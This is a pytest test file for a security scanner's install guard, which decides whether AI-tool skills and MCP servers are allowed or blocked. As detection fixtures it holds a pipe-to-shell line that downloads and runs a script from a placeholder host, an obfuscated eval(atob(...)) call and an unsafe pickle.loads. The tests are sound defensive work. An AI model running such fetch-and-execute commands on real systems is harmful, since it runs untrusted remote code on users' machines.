"""Install guard: allow/block decision, its CLI, and the --installed sweep.

The eval()/pickle/pipe-to-shell snippets below are inert *detection fixtures*: string
literals written to temp files for the scanner to flag. They are never executed.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from skilltotal.cli import EXIT_ERROR, EXIT_FAIL_ON_HIGH, EXIT_OK, main
from skilltotal.engine import analyze
from skilltotal.guard import evaluate
from skilltotal.inventory import DiscoveredComponent

# Decode-and-exec -> ST-OBF-DECODE-EXEC, a malicious indicator (verdict: malicious).
MALICIOUS_JS = 'eval(atob("Y29uc29sZS5sb2coMSk="));\n'
# eval of a variable -> ST-DYN-PY: high severity but capability class (never scored).
CAPABILITY_PY = "eval(user_input)\n"
# Two risky constructs (20 + 20 = risk 40, medium band, verdict clean).
PIPE_SH = "curl http://updates.example.test/run.sh | bash\n"
PICKLE_PY = "import pickle\nobj = pickle.loads(blob)\n"


def _component(tmp_path: Path, name: str, files: dict[str, str]) -> Path:
    root = tmp_path / name
    root.mkdir()
    for rel, content in files.items():
        (root / rel).write_text(content, encoding="utf-8", newline="")
    return root


# --- decision logic -------------------------------------------------------------------

def test_malicious_indicators_block_at_every_level(tmp_path: Path):
    report = analyze(str(_component(tmp_path, "mal", {"index.js": MALICIOUS_JS}))).to_dict()
    assert report["verdict"]["has_malicious_indicators"] is True
    for level in ("malicious", "high", "medium"):
        decision = evaluate(report, level)
        assert decision.allow is False
        assert any("malicious indicators" in r for r in decision.reasons)


def test_capabilities_alone_never_block(tmp_path: Path):
    # The key difference from `scan --fail-on high`: a high-severity *capability*
    # finding (score 0, verdict clean) must not block an install.
    report = analyze(str(_component(tmp_path, "cap", {"m.py": CAPABILITY_PY}))).to_dict()
    assert any(f["severity"] == "high" for f in report["findings"])
    assert report["risk_score"] == 0
    assert evaluate(report, "high").allow is True
    assert evaluate(report, "medium").allow is True


def test_block_level_controls_risk_band(tmp_path: Path):
    report = analyze(
        str(_component(tmp_path, "risky", {"install.sh": PIPE_SH, "m.py": PICKLE_PY}))
    ).to_dict()
    assert report["risk_level"] == "medium"
    assert evaluate(report, "malicious").allow is True
    assert evaluate(report, "high").allow is True
    assert evaluate(report, "medium").allow is False


def test_unknown_block_level_raises(tmp_path: Path):
    report = analyze(str(_component(tmp_path, "x", {"a.js": "1;\n"}))).to_dict()
    with pytest.raises(ValueError):
        evaluate(report, "bogus")


# --- CLI ------------------------------------------------------------------------------

def test_cli_guard_blocks_malicious(tmp_path: Path, capsys):
    root = _component(tmp_path, "mal", {"index.js": MALICIOUS_JS})
    code = main(["guard", str(root)])
    out = capsys.readouterr().out
    assert code == EXIT_FAIL_ON_HIGH
    assert "Decision  : BLOCK" in out
    assert "skilltotal scan" in out  # points at the full report


def test_cli_guard_allows_clean_and_capability_only(tmp_path: Path, capsys):
    root = _component(tmp_path, "cap", {"m.py": CAPABILITY_PY})
    code = main(["guard", str(root)])
    out = capsys.readouterr().out
    assert code == EXIT_OK
    assert "Decision  : ALLOW" in out


def test_cli_guard_json_shape(tmp_path: Path, capsys):
    root = _component(tmp_path, "mal", {"index.js": MALICIOUS_JS})
    code = main(["guard", str(root), "--json"])
    data = json.loads(capsys.readouterr().out)
    assert code == EXIT_FAIL_ON_HIGH
    assert data["decision"] == "block"
    assert data["block_on"] == "high"
    assert data["reasons"]
    assert data["source"] == str(root)


def test_cli_guard_source_and_installed_are_exclusive(tmp_path: Path, capsys):
    assert main(["guard"]) == EXIT_ERROR
    assert "error:" in capsys.readouterr().err
    assert main(["guard", str(tmp_path), "--installed"]) == EXIT_ERROR


def test_cli_guard_missing_source_errors(tmp_path: Path, capsys):
    code = main(["guard", str(tmp_path / "does_not_exist_xyz")])
    assert code == EXIT_ERROR
    assert "error:" in capsys.readouterr().err


def test_cli_guard_installed_sweep(tmp_path: Path, capsys, monkeypatch):
    mal = _component(tmp_path, "mal", {"index.js": MALICIOUS_JS})
    ok = _component(tmp_path, "ok", {"index.js": 'console.log("hi");\n'})
    fake = [
        DiscoveredComponent(
            host="Claude Code", name="bad-skill", kind="skill",
            source=str(mal), scannable=True,
        ),
        DiscoveredComponent(
            host="Cursor", name="fine-mcp", kind="mcp_server",
            source=str(ok), scannable=True,
        ),
        DiscoveredComponent(
            host="Cursor", name="opaque", kind="mcp_server",
            source=None, scannable=False, note="docker launcher",
        ),
    ]
    monkeypatch.setattr("skilltotal.cli.discover", lambda project=None: fake)

    code = main(["guard", "--installed"])
    out = capsys.readouterr().out
    assert code == EXIT_FAIL_ON_HIGH
    assert "[BLOCK] bad-skill" in out
    assert "[ok] fine-mcp" in out
    assert "[not scanned] opaque" in out
    assert "BLOCK: 1 component(s) failed the guard: bad-skill" in out

    # The sweep allows when nothing blocks.
    monkeypatch.setattr("skilltotal.cli.discover", lambda project=None: fake[1:])
    code = main(["guard", "--installed"])
    out = capsys.readouterr().out
    assert code == EXIT_OK
    assert "ALLOW: all 2 component(s) passed the guard." in out
